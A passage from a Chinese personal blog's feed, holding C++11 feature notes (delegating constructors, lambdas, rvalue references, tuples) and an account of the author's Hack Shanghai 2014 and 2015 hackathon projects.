<h2 id="委托构造函数">委托构造函数</h2><figure class="highlight aspectj"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Student</span> </span>&#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    Student(<span class="keyword">int</span> i, string n): id(i), name(n)&#123;&#125;</span><br><span class="line">    Student(): Student(0, <span class="string">"none"</span>)&#123;&#125;</span><br><span class="line"><span class="keyword">private</span>:</span><br><span class="line">    <span class="keyword">int</span> id;</span><br><span class="line">    string name;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<p>之前一直需要抽出公共的构造部分，有了委托后可以更加高效，因为在初始化列表中便初始化成员了。</p>
<h1 id="新特性">新特性</h1><h2 id="Lambda表达式">Lambda表达式</h2><p>其实在上文中已经使用过了一些，形如：<br><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">[<span class="link_label">闭包捕捉</span>](<span class="link_url">参数列表</span>) -&gt; 返回值类型 &#123;函数体&#125;</span><br><span class="line">[](int a, double b) -&gt; double &#123;return a+b;&#125;</span><br></pre></td></tr></table></figure></p>
<p>闭包是指在表达式中可以直接访问到表达式创建时的上下文中的变量，这样可以将特定的参数封在表达式内，调用时更加简洁。<br>在Javascript中，我们可以直接闭包。C++中区分了传值和传引用，所以我们必须通过[]来显式地捕捉外界的变量。<br>规则比较简单，<code>[=]</code>便是传值所有使用的外界变量；<code>[&amp;]</code>传引用；<code>[&amp;,x]</code>表示x传值，其他传引用；<code>[=,&amp;y]</code>表示y传递，其他传值。</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">int</span> a = <span class="number">100</span>, b = <span class="number">10</span>;</span><br><span class="line"><span class="comment">// auto 在这里很方便，-&gt;double也可以省去，可以被编译器自动推导</span></span><br><span class="line"><span class="keyword">auto</span> ff = [=](<span class="keyword">int</span> x, <span class="keyword">double</span> y) -&gt;<span class="keyword">double</span> &#123;<span class="keyword">return</span> a+b+x + y;&#125;;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"%f\n"</span>, ff(<span class="number">1</span>, <span class="number">2.2</span>));</span><br></pre></td></tr></table></figure>
<p>在使用标准库的高阶函数时，便可以使用函数表达式，省去了函数的申明和需要闭包的变量之前不方便传递的问题。<br><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">int</span> sum = <span class="number">0</span>;</span><br><span class="line"><span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt; nums&#123;<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>,<span class="number">5</span>&#125;;</span><br><span class="line">for_each(nums.begin(), nums.end(), [&amp;sum](<span class="keyword">int</span> a)&#123;sum+=a;&#125;);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"%d\n"</span>, sum);</span><br></pre></td></tr></table></figure></p>
<p>Javascript中非常常见的立即调用表达式。<br><figure class="highlight clojure"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="collection">[]</span> <span class="collection">&#123; printf<span class="list">(<span class="string">"Hi\n"</span>)</span><span class="comment">; &#125; ();</span></span><br><span class="line"><span class="collection">[]</span><span class="list">(<span class="keyword"><span class="built_in">int</span></span> i)</span> <span class="collection">&#123; printf<span class="list">(<span class="string">"Hi%d\n"</span>, i)</span><span class="comment">; &#125; (100);</span></span></span></span><br></pre></td></tr></table></figure></p>
<h2 id="右值引用">右值引用</h2><p><a href="http://harttle.com/2015/10/11/cpp11-rvalue.html" target="_blank" rel="external">详细的介绍可参考这里</a>，写得很详细。 </p>
<p>这个右值引用应该还是很好的特性。不过需要使用者明白自己究竟在做什么，主要是减少了同类中的一些冗余的拷贝过程。<br>不过我们当时的争论在于如果只是使用指针，也可以达到同样的效果，不过这里便没有类的封装性了，标准库也没办法通过<code>move</code>告知进行内部成员的移动。不过使用智能指针应该是可以达到同样的效果。<br>当时还认为如果内部变量是new获得的，应该自行管理不能传递，不过我认为这里的管理都是在同类型中间进行，传递也只是同类的实例传递给另外一个同类，所以管理是封闭在类的内部的，是符合自行管理new创造的对象的。</p>
<h2 id="元组">元组</h2><p>可以用来返回多个返回值。<br><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="built_in">std</span>::tuple&lt; <span class="keyword">int</span> , <span class="keyword">double</span>, <span class="built_in">string</span>       &gt; tuple_1;</span><br><span class="line"><span class="keyword">typedef</span> <span class="built_in">std</span>::tuple&lt; <span class="keyword">char</span>, <span class="keyword">short</span> , <span class="keyword">const</span> <span class="keyword">char</span> * &gt; tuple_2;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span> <span class="keyword">const</span> *argv[])</span></span><br><span class="line"></span>&#123;</span><br><span class="line">    tuple_1 t1;</span><br><span class="line">    tuple_2 t2 &#123;<span class="string">'X'</span>, <span class="number">2</span>, <span class="string">"Hola!"</span>&#125;; <span class="comment">// ()或是&#123;&#125;初始化都可以，不过建议使用新的&#123;&#125;统一初始化</span></span><br><span class="line">    t1 = t2 ; <span class="comment">// 第三个字串元素可由'const char *'隐式转换</span></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<p>摘自Wikipedia。</p>
<h1 id="增强的标准库">增强的标准库</h1><h2 id="并发库（线程、锁、原子操作）">并发库（线程、锁、原子操作）</h2><h2 id="正则表达式库">正则表达式库</h2><h2 id="通用智能指针">通用智能指针</h2><h2 id="散列表">散列表</h2><h2 id="随机数生成">随机数生成</h2><h2 id="变长参数模板">变长参数模板</h2><h2 id="多态函数对象包装器">多态函数对象包装器</h2><h1 id="其他">其他</h1><p>最近希望做到动态的、有不同函数签名的函数的动态调用，后来只能使用switch case实现。<br>看到C++17标准中有一个<code>invoke</code>，似乎是动态地通过参数列表调用一个<code>callable</code>对象，也许以后还会加入GC和reflect。</p>
<p><a href="https://zh.wikipedia.org/wiki/C%2B%2B11" target="_blank" rel="external">更多改动可参考Wikipedia</a><br><a href="http://coolshell.cn/articles/5265.html" target="_blank" rel="external">Coolshell</a></p>
]]></content>
    <summary type="html">
    <![CDATA[<p>我学的第一门语言便是C++，不过由于后期一直没有使用C++写过较大的项目，一直处于入门阶段。最近实习，第一个小项目便是搭建一个代理服务器，Manager处于对性能的要求，希望我用C++实现。当时比较懒，觉得用C++重写代理服务器进展会比较慢，便说服Manager让我使用Go]]>
    </summary>
    
      <category term="cpp" scheme="http://yqf3139.github.io/tags/cpp/"/>
    
      <category term="programming" scheme="http://yqf3139.github.io/categories/programming/"/>
    
  </entry>
  
  <entry>
    <title><![CDATA[Hack Shanghai 体验 2015]]></title>
    <link href="http://yqf3139.github.io/2015/11/09/hackshanghai-2015/"/>
    <id>http://yqf3139.github.io/2015/11/09/hackshanghai-2015/</id>
    <published>2015-11-09T11:18:56.000Z</published>
    <updated>2015-11-09T15:17:23.659Z</updated>
    <content type="html"><![CDATA[<p><img src="/images/hackshanghai-2015/logo_purple.png" alt="hackshanghai"></p>
<h2 id="什么是Hackathon？">什么是Hackathon？</h2><p>产品/服务开发需要耗费大量的人力，但经常一个很好的商业模式或是产品，都萌发自一两个人的小小想法，短时间内拿出一个Prof of Concept的原型，去证明你的想法，发现问题非常重要。</p>
<p>Hackathon就是程序员集中在一起，快速进行ideas 2 reality的活动，并且相互交流的过程。它通常由一个主办者发起，有大量的赞助商支持，通过严格的条件，比如限定24小时完成，限定方向和开发平台，来筛选出优秀的想法和开发者。当然，作为回报，Hackathon通常有优厚的奖品或是实习机会来吸引活跃的程序员。</p>
<p>应该来说每人都会经历自己的Hackathon，这个并不仅仅是软件行业。当你产生一个想法，并且你特别希望bring it to reality的时候，一次Hackathon就开始了。时间有长有短，可以是任何事情。</p>
<p>这一过程中的各个阶段：初期想法的产生，具体化细节，寻找合作伙伴，交流，推广，获取到别人的支持，反思评价都很有意思。其中还夹杂着很多情绪，兴奋，喜悦，妥协，各种压力，都会在短短的限定时间内爆发。走下去不放弃是必须的，当然这并不包括发现自己的想法不能实现，如果是这样，那你至少证明了它没有意义，或是有几个世界级的瓶颈。</p>
<p>所以大家都应该抓住机会参加一次Hackathon，能从这一过程和各种人身上学到很多，也能接触到很多新的平台和技术。</p>
<h2 id="Hack_Shanghai_2014">Hack Shanghai 2014</h2><p>2014年的11月初，我和颢神、苗姐、冰神等在参加完软创大赛后，直接飞来上海，和姚神碰面参加Hack Shanghai 2014。想法在去之前有所讨论，但仍然不够清晰，是从我一个小小的技术尝试萌发的。</p>
<p>我们希望提升现有的网页视频播放的体验。通过定制化的界面，用户看到的是一个聚合好的视频库，资源来自各大视频网站。再通过智能手机充当遥控器，你便可以舒服得靠在沙发上，通过滑动屏幕、挥动手机进行视频的，进度拖动等操作。</p>
<p>经历了24小时的鏖战（睡了不到三小时），我们达到预期的效果了。姚神交互界面非常酷炫，颢神将各大视频站的资源破解使用，苗姐制作了美工并且准备了制胜法宝——PPT，我则开发Android上的遥控器，将触屏和加速度的数据处理后发到浏览器中控制视频。</p>
<p>第一次通宵熬夜，早上六七点时异常的难受。不过姚神一夜没睡，仍在战斗。随着代码合并，产品成型，效果超出了我们的预期。<br>产品展示环节我们站在自己的Booth旁边，不断向旁人展示我们的应用，其他组的产品创意也很好，有利用pebble手表进行阅读的应用，通过不断改变显示的文字，人眼可以在一个小屏幕上面舒适地阅读文章。<br>还有利用Leap Motion做厨房教学应用的点子，在hackathon上，很多硬件产品可以租借，利用一个全新的平台做出应用，这是开发商非常希望看到的。</p>
<p>被选入前九后，也就意味着我们要在评委和所有的250个Hacker面前再展示一次。姚哥进行了产品的阐述，我在一旁demo，效果很赞，评委们也很有兴趣地问了我们一些技术实现细节。</p>
<p><img src="/images/hackshanghai-2015/1.png" alt="hackshanghai"></p>
<p><img src="/images/hackshanghai-2015/2.png" alt="hackshanghai"></p>
<p>打开youku就能看到一个更好的视频界面。视频浏览页面，可以左右滑动。</p>
<p>上海纽约大学的确让第一届Hackathon Shanghai成为了现实，中国和外国志愿者们都非常热心，<br>最后我们拿到了很不错的奖品，一行五人，去人民广场开心地吃了顿日料，返程回校。</p>
<h2 id="Hack_Shanghai_2015">Hack Shanghai 2015</h2><p>由于正好在上海实习，我便和冰神、火只和苗姐组队，再一次踏上hackathon之旅。</p>
<p>这次前期我们设想了很多Leap Motion的应用。</p>
<ul>
<li>进行数据可视化的互动，将一份金融或是教育领域的数据进行可视化，通过Leap Motion，利用手来与数据进行三维的互动，并且多人协同，可以共同编辑一份数据。</li>
<li>或是用两根手指进行足球对抗赛，两只手指可以控制前进、后退或是射门，另外一只手可以控制奔跑的方向，也是可以在网页上进行多人的对抗。</li>
<li>或是两根手指滑雪，进行神庙逃亡等等。</li>
</ul>
<p>还有一些稀奇古怪的想法，</p>
<ul>
<li>利用Leap Motion教会你正确的刷牙姿势。不过一个Leap Motion似乎难以进行脸和手的相对位置的定位，由于手头没有Leap Motion，以后可以试试是否可行。我脑洞一开，觉得可以弄棍子穿着Leap Motion进行模拟刷牙，这样它捕捉的人脸的一部分应该足以计算出他们的相对位置。不过也难以进行尝试和实现。</li>
<li>多人工作时候的协作，需求还不太明确。</li>
<li>用头部姿态玩一些汽车的姿态控制游戏（画面太美）。</li>
<li>任意网页弹幕。通过架设一个私人服务器，让在多地的相互认识的人能愉快的在同一个网页上弹幕，可以是小说，视频等等，还可以同步播放进度，发射弹幕聊天，自动进行鼠标位置的告知，对某些网页内容进行涂鸦，一个很好的应用便是异地的情侣，他们可以共同观看一个电影等，当然还可以加上实时的语音功能，不过得过滤掉网页上的媒体声音。</li>
</ul>
<p>开幕式后，我们便继续讨论比较中意的Leap Motion应用，可是后来并没有借到Leap Motion。后来发现图灵机器人提供的Api还比较有趣的，它号称人工智能，能够进行情感的理解和表达。</p>
<p>我们最终做了Robot T，想做一个Web浏览器上的Google Now on Tap，<br>大致想法是让图灵机器人阅读你正在阅读的内容，像是一个你信任的好朋友站在身边，和你一起浏览。</p>
<p><img src="/images/hackshanghai-2015/3.png" alt="hackshanghai"><br><img src="/images/hackshanghai-2015/4.png" alt="hackshanghai"><br><img src="/images/hackshanghai-2015/5.png" alt="hackshanghai"><br><img src="/images/hackshanghai-2015/9.png" alt="hackshanghai"><br>比如知乎闲逛的时候，它会对你关注的问题主动地提出自己的看法，也许能惊艳到你。</p>
<p><img src="/images/hackshanghai-2015/8.png" alt="hackshanghai"><br>或者你滑词提示它阅读一些内容。</p>
<p><img src="/images/hackshanghai-2015/6.png" alt="hackshanghai"><br>他会在你午餐时间，基于你浏览的餐馆信息，向你推荐菜谱和餐馆。</p>
<p><img src="/images/hackshanghai-2015/7.png" alt="hackshanghai"><br>告示天气变化。</p>
<p>还有比如在你进行理财的时候，主动告诉你一些你可能会感兴趣的经济信息。</p>
<p>不过图灵机器人很多方面做得还是不如百度小度机器人，希望他们继续努力吧。</p>
<p>实现过程同样艰苦，我们奋斗到三点，终于熬不住去三楼找了个沙发躺了四个小时。早上起来的时候各种不好，不过还好没喝红牛，苗姐提示它含有激素。</p>
<p>本次的演示只有三分钟，三个外国教授进行评价。应该来说评委对我们的产品思想比较感兴趣，不过由于图灵机器人只能理解中文，我们只做了中文知乎和工商银行的网页的自动阅读和提示。</p>
<p>实现过程中我也有所失误，好长时间没写UI，抓耳挠腮写不出好看的，还好火只后期帮忙。<br>还有就是过于重视实现了，展现效果却比较差。使用者无法瞬间get这个应用的point。<br>和外国教授交流的时候也深深感受到了自己口语的拙技。</p>
<p>本次还看到了几个不错的项目。</p>
<ul>
<li>两人协同的平衡球游戏。看了知乎回答，的确24小时实现不简单。两个人协作让一个小球滚入洞中。你可以把一个小球从一个手机倒入另一个。由于手机的相对位置还可以移动，他们需要解决利用两个手机的传感器进行相对位置的计算。Web实现，微信分享链接就能一起玩，关卡设置花样很多，如果推广一下能火。</li>
<li>一个利用Leap Motion让很多传感器上方的区域变成可点击的区域。比如上面摆着几本书，便可以选中其中一本。不过其实有点杀鸡用牛刀了。他们对使用场景还进了商业化的设想。团队四人来自清华，队长非常积极和健谈。和上海纽约大学的一位多媒体实验室的老师谈一些人机交互的技术。老师拿出了一个Project Tango设备进行展示。队长口语非常不错。</li>
<li>还有一个是一个Chrome扩展，能在你百度搜索一些电影的时候，将背景变为trailer进行展示，效果很震撼，估计百度前段要哭了。不过视频的加载需要时间，内容需要提前分发到浏览器本地缓存。他们还做了很多的商业设想，我很佩服，虽然短时间内没办法全部实现展示，但这个意识非常好。</li>
</ul>
<p>今天看了相关的知乎问题，共同经历了过hackathon，通过其他Hacker的心路历程，我们也能学到很多。<br><a href="http://www.zhihu.com/question/37271008" target="_blank" rel="external">http://www.zhihu.com/question/37271008</a></p>
]]></content>
    <summary type="html">
    <![CDATA[<p><img src="/images/hackshanghai-2015/logo_purple.png" alt="hackshanghai"></p>
<h2 id="什么是Hackathon？">什么是Hackathon？</h2><p>产品/服务开发需要耗费大量的人力]]>
    </summary>
    
      <category term="hackathon" scheme="http://yqf3139.github.io/tags/hackathon/"/>
    
      <category term="flood" scheme="http://yqf3139.github.io/categories/flood/"/>
    
  </entry>
  
</feed>
